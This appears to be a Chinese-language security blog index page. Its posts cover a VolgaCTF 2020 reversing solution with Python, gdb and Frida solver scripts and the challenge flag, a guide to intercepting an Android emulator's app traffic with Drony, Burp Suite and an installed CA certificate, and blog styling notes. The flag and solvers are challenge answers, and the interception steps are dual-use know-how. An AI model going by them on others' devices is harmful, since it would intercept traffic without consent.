<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>歐欸利恩的部落格</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="歐欸利恩的部落格"><meta name="msapplication-TileImage" content="/images/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="歐欸利恩的部落格"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="歐欸利恩的部落格"><meta property="og:url" content="http://oalieno.github.io/"><meta property="og:site_name" content="歐欸利恩的部落格"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://oalieno.github.io/img/og_image.png"><meta property="article:author" content="oalieno"><meta property="article:tag" content="blog, security, programming, coding, life"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://oalieno.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://oalieno.github.io"},"headline":"歐欸利恩的部落格","image":["http://oalieno.github.io/img/og_image.png"],"author":{"@type":"Person","name":"oalieno"},"publisher":{"@type":"Organization","name":"歐欸利恩的部落格","logo":{"@type":"ImageObject","url":{"text":"歐欸利恩的部落格","img":"/images/logo.svg"}}},"description":""}</script><link rel="icon" href="/images/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&amp;family=Material+Icons&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=G-LYLB67MBLS" async></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
    
        gtag('config', 'G-LYLB67MBLS');</script><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }
          Array
              .from(document.querySelectorAll('.tab-content'))
              .forEach($tab => {
                  $tab.classList.add('is-hidden');
              });
          Array
              .from(document.querySelectorAll('.tabs li'))
              .forEach($tab => {
                  $tab.classList.remove('is-active');
              });
          const $activeTab = document.querySelector(location.hash);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
          const $tabMenu = document.querySelector(`a[href="${location.hash}"]`);
          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img nolazy src="/images/logo.svg" alt="歐欸利恩的部落格" height="28"><p>歐欸利恩的部落格</p></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首頁</a><a class="navbar-item" href="/archives">文章</a><a class="navbar-item" href="/categories">分類</a><a class="navbar-item" href="/tags">標籤</a><a class="navbar-item" href="/about">關於我</a></div><div class="navbar-end"><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-05-03T16:00:00.000Z" title="5/4/2020, 12:00:00 AM">2020-05-04</time></span><i class="material-icons">schedule</i><span class="level-item">7 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/writeups/">writeups</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/05/04/f-hash/">【CTF Writeups】VolgaCTF Quals 2020 - F-Hash</a></h1><div class="content"><p>這題給了一個 x86-64 ELF Executable，直接跑下去跑不出來，一直卡在那裡，逆向一下會發現 <code>13B0</code> 這個函式是一個遞迴函式，他的虛擬碼大概長下面這樣，會一直遞迴呼叫前兩層的答案，很明顯的有很多重複的子問題，這時候就是要用 Dynamic Programming 的思路來把算過的答案記下來就不會跑那麼久了，所以這題就是要優化這個函式，把程式跑完就會印出 flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_13B0</span>(<span class="params">depth, a, b</span>):</span><br><span class="line">    ...</span><br><span class="line">    r1 = _13B0(depth - <span class="number">1</span>, a, b)</span><br><span class="line">    r2 = _13B0(depth - <span class="number">2</span>, a, b)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>以下提供三種解法，讀者可以跟著練習一下。</p>
<h2 id="Rewrite-Function-with-Python">Rewrite Function with Python</h2>
<p>最直覺的方法就是把 IDA decompile 出來的 code 搬到 python 上重寫一下，沒什麼技術，這是我在賽中用的方法，但就是要注意一下型態的問題，比如兩個 unsigned int 相乘可能 overflow 在 python 裡面要 <code>mod (1 &lt;&lt; 32)</code>，更多細節請看下面的程式碼。</p>
<figure class="highlight python"><figcaption><span>solve-rewrite.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">table = [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    table += [i * <span class="number">10</span> + <span class="number">1</span> + (<span class="number">0xf6</span> &lt;&lt; <span class="number">120</span>)] * <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bitcountsum</span>(<span class="params">a, b</span>):</span><br><span class="line">    a %= (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)</span><br><span class="line">    b %= (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bin</span>(a).count(<span class="string">&#x27;1&#x27;</span>) + <span class="built_in">bin</span>(b).count(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">a, b, depth = <span class="number">256</span></span>):</span><br><span class="line">    ans = [<span class="number">0</span>]</span><br><span class="line">    ans.append((bitcountsum(a, b), <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    ans.append((bitcountsum(a ^ <span class="number">1</span>, b), <span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, depth + <span class="number">1</span>):</span><br><span class="line">        v15, v16 = ans[i - <span class="number">1</span>], ans[i - <span class="number">2</span>]</span><br><span class="line">        v13 = ((v15[<span class="number">0</span>] + v15[<span class="number">1</span>] * (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)) + (v16[<span class="number">0</span>] + v16[<span class="number">1</span>] * (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)) + bitcountsum((v15[<span class="number">2</span>] + v16[<span class="number">2</span>]) ^ a, b)) % (<span class="number">1</span> &lt;&lt; <span class="number">128</span>)</span><br><span class="line">        v14 = table[i]</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> (v14 &gt;&gt; <span class="number">64</span>) &gt; (v13 &gt;&gt; <span class="number">64</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> (v14 &gt;&gt; <span class="number">64</span>) == (v13 &gt;&gt; <span class="number">64</span>):</span><br><span class="line">                <span class="keyword">if</span> v14 % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) &gt;= v13 % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            k = <span class="built_in">max</span>(<span class="number">1</span>, (v13 &gt;&gt; <span class="number">64</span>) // (v14 &gt;&gt; <span class="number">64</span>))</span><br><span class="line">            v13 = (v13 - k * v14) % (<span class="number">1</span> &lt;&lt; <span class="number">128</span>)</span><br><span class="line">        ans.append((v13 % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>), (v13 &gt;&gt; <span class="number">64</span>), (v15[<span class="number">2</span>] + v16[<span class="number">2</span>]) % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)))</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">al = [<span class="number">0x6369757120656854</span>, <span class="number">0x706d756a20786f66</span>, <span class="number">0x20797a616c206568</span>, <span class="number">0</span>]</span><br><span class="line">bl = [<span class="number">0x206e776f7262206b</span>, <span class="number">0x74207265766f2073</span>, <span class="number">0x80676f64</span>, <span class="number">0x2b</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(al, bl):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">hex</span>, calc(a, b)[<span class="number">256</span>])))</span><br></pre></td></tr></table></figure>
<h2 id="GDB">GDB</h2>
<p>另一個方法是我在賽後看 <a target="_blank" rel="noopener" href="https://pastebin.com/Dj6wteXk">別人</a> 用的，在 gdb 寫 python 去 hook <code>13B0</code> 的開頭和結尾，在開頭判斷這組參數有沒有出現過了，跑過就把參數的 <code>depth</code> 設成 1 也就是 base case 讓他不要再往下遞迴了，而因為同一組函式的 <code>Start, End</code> Hook 沒辦法共享資訊，所以需要維護一個 <code>state</code> 來放目前的參數，在結尾的時候一樣是看這組參數有沒有出現過，有就把答案寫上去，沒有就把答案存起來下次就不會再跑一次了。</p>
<figure class="highlight python"><figcaption><span>solve-gdb.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(gdb.parse_and_eval(name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">address, size</span>):</span><br><span class="line">    inf = gdb.inferiors()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> inf.read_memory(address, size).tobytes()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">address, buf</span>):</span><br><span class="line">    inf = gdb.inferiors()[<span class="number">0</span>]</span><br><span class="line">    inf.write_memory(address, buf)</span><br><span class="line"></span><br><span class="line">memory = &#123;&#125;</span><br><span class="line">state = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Start</span>(gdb.Breakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, location</span>):</span><br><span class="line">        <span class="built_in">super</span>(Start, self).__init__(spec = location, <span class="built_in">type</span> = gdb.BP_BREAKPOINT, internal = <span class="literal">False</span>, temporary = <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        state.append((register(<span class="string">&#x27;$rdi&#x27;</span>), register(<span class="string">&#x27;$rsi&#x27;</span>), register(<span class="string">&#x27;$rdx&#x27;</span>), register(<span class="string">&#x27;$rcx&#x27;</span>)))</span><br><span class="line">        <span class="keyword">if</span> memory.get(state[-<span class="number">1</span>][<span class="number">1</span>:]) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            gdb.execute(<span class="string">&#x27;set $rsi = 1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">End</span>(gdb.Breakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, location</span>):</span><br><span class="line">        <span class="built_in">super</span>(End, self).__init__(spec = location, <span class="built_in">type</span> = gdb.BP_BREAKPOINT, internal = <span class="literal">False</span>, temporary = <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> state</span><br><span class="line">        buf, h = state[-<span class="number">1</span>][<span class="number">0</span>], state[-<span class="number">1</span>][<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> memory.get(h) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            memory[h] = (read(buf, <span class="number">8</span>), read(buf + <span class="number">8</span>, <span class="number">8</span>), read(buf + <span class="number">16</span>, <span class="number">8</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            write(buf, memory[h][<span class="number">0</span>])</span><br><span class="line">            write(buf + <span class="number">8</span>, memory[h][<span class="number">1</span>])</span><br><span class="line">            write(buf + <span class="number">16</span>, memory[h][<span class="number">2</span>])</span><br><span class="line">        state = state[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">Start(<span class="string">f&#x27;*<span class="subst">&#123;<span class="number">0x0000555555554000</span> + <span class="number">0x13b0</span>&#125;</span>&#x27;</span>)</span><br><span class="line">End(<span class="string">f&#x27;*<span class="subst">&#123;<span class="number">0x0000555555554000</span> + <span class="number">0x1424</span>&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><code>gdb f-hash</code> 之後，在 gdb 裡面執行 <code>source solve-gdb.py</code> 就可以跑上面的程式碼了<br>
或是也可以在執行 gdb 的時候就載入 <code>gdb -x solve-gdb.py f-hash</code></p>
<h2 id="Frida">Frida</h2>
<p>這個方法也是我賽後看 <a target="_blank" rel="noopener" href="https://sectt.github.io/writeups/Volga20/f-hash/README">別人</a> 用的，frida 真的是好東西，之前剛好有研究一點 frida，第一次用在比賽中，基本上跟前一個解法一樣去 hook 函式的開頭和結尾，不過 frida 又更方便了，請看下面程式碼。</p>
<figure class="highlight javascript"><figcaption><span>solve-frida.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> base = <span class="title function_">ptr</span>(<span class="title class_">Process</span>.<span class="title function_">enumerateModulesSync</span>()[<span class="number">0</span>].<span class="property">base</span>)</span><br><span class="line"><span class="keyword">var</span> recursive_func_ptr = base.<span class="title function_">add</span>(<span class="number">0x13b0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mem = &#123;&#125;</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(recursive_func_ptr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">buf</span> = args[<span class="number">0</span>]</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">hash</span> = args[<span class="number">1</span>] + <span class="string">&#x27;-&#x27;</span> + args[<span class="number">2</span>] + <span class="string">&#x27;-&#x27;</span> + args[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> (mem[<span class="variable language_">this</span>.<span class="property">hash</span>] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">            args[<span class="number">1</span>] = <span class="title function_">ptr</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mem[<span class="variable language_">this</span>.<span class="property">hash</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            mem[<span class="variable language_">this</span>.<span class="property">hash</span>] = [<span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">readU64</span>(), <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">add</span>(<span class="number">8</span>).<span class="title function_">readU64</span>(), <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">add</span>(<span class="number">16</span>).<span class="title function_">readU64</span>()]</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">writeU64</span>(mem[<span class="variable language_">this</span>.<span class="property">hash</span>][<span class="number">0</span>])</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">add</span>(<span class="number">8</span>).<span class="title function_">writeU64</span>(mem[<span class="variable language_">this</span>.<span class="property">hash</span>][<span class="number">1</span>])</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">add</span>(<span class="number">16</span>).<span class="title function_">writeU64</span>(mem[<span class="variable language_">this</span>.<span class="property">hash</span>][<span class="number">2</span>])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>最後執行 <code>frida --no-pause --runtime=v8 -l solve-frida.js ./f-hash</code> 就可以了</p>
<h2 id="Flag">Flag</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VolgaCTF&#123;16011432ba16efc8dcf779477985b3b9&#125;</span><br></pre></td></tr></table></figure>
<hr>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/OAlienO/CTF/tree/master/2020/VolgaCTF/F-Hash">https://github.com/OAlienO/CTF/tree/master/2020/VolgaCTF/F-Hash</a></li>
<li><a target="_blank" rel="noopener" href="https://pastebin.com/Dj6wteXk">https://pastebin.com/Dj6wteXk</a></li>
<li><a target="_blank" rel="noopener" href="https://sectt.github.io/writeups/Volga20/f-hash/README">https://sectt.github.io/writeups/Volga20/f-hash/README</a></li>
</ol>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/05/04/f-hash/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-03-17T16:00:00.000Z" title="3/18/2020, 12:00:00 AM">2020-03-18</time></span><i class="material-icons">schedule</i><span class="level-item">5 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">資安</a><span> / </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/reverse/">reverse</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/03/18/android-proxy/">【安卓逆向】透過 Burp Suite Proxy 夜神模擬器</a></h1><div class="content"><h2 id="前言">前言</h2>
<p>在上一篇 adb 的環境佈置中，我們是用 Android Emulator，但我想要 reverse 的 app 只有支援 arm ( 蠻多 app 都沒有支援 x86-64 的 )，而在我 x86-64 機器上的 Android Emulator 上開 arm 的虛擬機很慢，所以我就換用了 Nox Player，他同時支援 arm 跟 x86-64 的架構，速度也挺快的。</p>
<p>恩等等，我剛剛才發現原來 Nox Player 是在 VirtualBox 上面開一台虛擬機跑，傻眼。</p>
<details class="admonition question" open><summary>怎麼知道這個 app 支援什麼</summary><p><p>用 apktool 解開 apk 檔後，看 <code>/lib</code> 資料夾下面有哪些資料夾，可能會有 <code>arm64-v8a</code>、<code>armeabi-v7a</code>、<code>x86</code>、<code>x86_64</code> 等，這些就是這個 app 用到的函式庫，沒有對應架構的函式庫當然就是不支援了，或者有些 app 會將每個架構分開發佈，只要去下載對應架構的 app 就可以了。</p>
</p></details>
<details class="admonition question" open><summary>adb 怎麼連上夜神模擬器</summary><p><p>夜神模擬器預設會把 adb server 開在 port 62001, 62025, 62026, … ( 我不知道為什麽 62001 直接跳到 62025 )<br>
所以 <code>adb connect localhost:62001</code> 就可以啦</p>
</p></details>
<h2 id="Drony"><a target="_blank" rel="noopener" href="https://apkpure.com/tw/drony/org.sandroproxy.drony">Drony</a></h2>
<p>主要是參考這篇 <a target="_blank" rel="noopener" href="https://king-sabri.net/android-hacking-setup-global-proxy-for-all-apps-in-android-without-root-with-burp-suite/">Android Hacking | Setup Global Proxy for All Apps in Android (without root) with Burp Suite<br>
</a> 的教學，在使用 Drony 前，我還有用過另一款叫 ProxyDroid，不過沒成功，不知道出了什麼事。</p>
<p>基本流程是這樣的，因為 Drony 本身也是一個 proxy server，所以要先在 Android 的設定中將 proxy 導向到 Drony，然後在 Drony 的設定中將 proxy 導向主機的 Burp Suite。</p>
<h3 id="第一步">第一步</h3>
<p>打開 Android 的設定，照著下面這樣點<br>
設定 &gt; 無限與網路 &gt; Wi-Fi &gt; 你的 Wi-FI 的名字 ( 長按他 ) &gt; 修改網路 &gt; 顯示進階選項 &gt; Proxy ( 手動 )<br>
主機名稱填 127.0.0.1，通訊埠填 8020 ( Drony 預設的通訊埠 )</p>
<h3 id="第二步">第二步</h3>
<p>打開 Drony 的設置，照著下面這樣點<br>
設置 &gt; 網路 &gt; 無線網路 &gt; 你的 Wi-FI 的名字<br>
代理類型選手冊 ( 也就是 Manual，真爛的翻譯 )，主機名稱填主機的 ip，通訊埠填 8080 ( Burp Suite 預設的通訊埠 )</p>
<details class="admonition question" open><summary>怎麼找主機的 ip</summary><p><p>主機基本上會是 Nox Player 的 default gateway ( 其實就是在 VirtualBox 的 NAT Mode )，所以下 <code>adb shell ip route show</code> 找到 default gateway 就是主機的 ip 了</p>
</p></details>
<h3 id="完成">完成</h3>
<p>這樣就設定好啦，在日誌頁面把開關打開就可以了。</p>
<h2 id="Burp-Suite-憑證安裝">Burp Suite 憑證安裝</h2>
<p>順便安裝一下 Burp Suite 的憑證，這樣就不會一直跳憑證問題了<br>
先到 <a target="_blank" rel="noopener" href="http://burp">http://burp</a> 下載 Burp Suite 的憑證，載下來是 der 副檔名的話，先把他改名成 cer 副檔名結尾<br>
打開 Android 的設定，照著下面這樣點<br>
設定 &gt; 個人 &gt; 安全性 &gt; 憑證儲存空間 &gt; 從 SD 卡安裝 ( 選 cacert.cer )<br>
安裝的時候他會叫你設定一下 PIN 碼</p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/03/18/android-proxy/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-02-21T16:00:00.000Z" title="2/22/2020, 12:00:00 AM">2020-02-22</time></span><i class="material-icons">schedule</i><span class="level-item">2 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E7%A8%8B%E5%BC%8F/">程式</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/02/22/blog02/">【部落格開發日誌】0x02</a></h1><div class="content"><h2 id="Admonition">Admonition</h2>
<p>我把 <a target="_blank" rel="noopener" href="https://squidfunk.github.io/mkdocs-material/extensions/admonition/">Material for MkDocs - Admonition Extension</a> 搬過來啦，因為實在太好看，就搬過來用了，並且做了下面兩個小改動</p>
<ol>
<li>把 <code>border-radius</code> 拔掉了，還是方的好看</li>
<li>陰影改淡了，感覺比較對</li>
</ol>
<details class="admonition example" open><summary>example</summary><p><p>這是範例</p>
</p></details>
<details class="admonition note" open><summary>note</summary><p><p>這是範例</p>
</p></details>
<details class="admonition abstract" open><summary>abstract</summary><p><p>這是範例</p>
</p></details>
<details class="admonition info" open><summary>info</summary><p><p>這是範例</p>
</p></details>
<details class="admonition tip" open><summary>tip</summary><p><p>這是範例</p>
</p></details>
<details class="admonition success" open><summary>success</summary><p><p>這是範例</p>
</p></details>
<details class="admonition question" open><summary>question</summary><p><p>這是範例</p>
</p></details>
<details class="admonition warning" open><summary>warning</summary><p><p>這是範例</p>
</p></details>
<details class="admonition failure" open><summary>failure</summary><p><p>這是範例</p>
</p></details>
<details class="admonition danger" open><summary>danger</summary><p><p>這是範例</p>
</p></details>
<details class="admonition quote" open><summary>quote</summary><p><p>這是範例</p>
</p></details>
<h3 id="實作">實作</h3>
<p>從 <a target="_blank" rel="noopener" href="https://github.com/haishanh/hexo-tag-admonition">hexo-tag-admonition</a> 借 code 過來改<br>
基本上就是 register 一個新的 hexo tag，然後用到了 <code>details</code> 和 <code>summary</code> 這兩個 html5 新的 tag<br>
改的時候有幾個小地方要注意</p>
<ol>
<li><code>details</code> tag 原本就有一個箭頭但是很醜，在 <code>summary::-webkit-details-marker</code> 設定 <code>display:none</code> 拔掉他</li>
<li>icon 用到了 <code>font-family: Material Icons</code>，要在 <code>head</code> 裡面加個字體</li>
</ol>
<h2 id="Code-block">Code block</h2>
<p>另一個改動是程式碼區塊的部分，原來的有點小醜，就改了幾下</p>
<ol>
<li>沒有給檔名就不要顯示上面的 header</li>
<li>可以指定起始行數，以及指定標記特定行數，如下範例</li>
</ol>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python run.py &gt;3,6</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><figcaption><span>run.py >3,6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;test <span class="subst">&#123;math.factorial(<span class="number">5</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
